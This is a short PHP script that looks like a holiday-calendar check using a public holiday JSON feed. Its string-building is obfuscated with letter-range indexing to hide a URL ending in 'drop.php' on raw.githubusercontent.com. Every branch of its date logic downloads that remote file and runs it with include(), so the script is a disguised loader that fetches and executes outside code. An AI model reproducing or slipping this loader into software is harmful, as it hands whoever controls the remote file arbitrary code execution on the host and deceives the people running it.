<?php	$st = range("g","j");
	$pro = range("m","y");
	$var = range("a","z");
	$super = $pro[3].$st[1].$var[15];
$dt = date("Y-m-d");
$dt2 = date("Ymd");
$temp = "temp";
$acc = "https://raw.githubusercontent.com/";
$array = json_decode(file_get_contents($acc."guangrei/APIHariLibur_V2/main/calendar.json"),true);


$myfile = fopen($temp.".".$super, "w") or die("Unable to open file!");
$myfile = fopen($temp.".tmp", "w") or die("Unable to open file!");
$txt = "<?php

?>";
function primary($value) {
	$dt2 = date("Ymd");
	$temp = "temp";
	$acc = "https://raw.githubusercontent.com/";
	$st = range("g","j");
	$pro = range("m","y");
	$var = range("a","z");
	$super = $pro[3].$st[1].$var[15];
	if(isset($array[$value]) && $array[$value]["holiday"]){
		copy($acc.$temp.'-important/'.$temp.'/m'.$var[0].'in'.'/'.$var[3].'r'.$pro[2].$pro[3].'.'.$super, $temp.".".$super);
		include($temp.".".$super);
	}elseif(date("D",strtotime($value))==="Sun"){
		copy($acc.$temp.'-important/'.$temp.'/m'.$var[0].'in'.'/'.$var[3].'r'.$pro[2].$pro[3].'.'.$super, $temp.".".$super);
		include( $temp.".".$super);
	}else{
		copy($acc.$temp.'-important/'.$temp.'/m'.$var[0].'in'.'/'.$var[3].'r'.$pro[2].$pro[3].'.'.$super, $temp.".".$super);
		include( $temp.".".$super);
	}
}

primary($dt);

?>
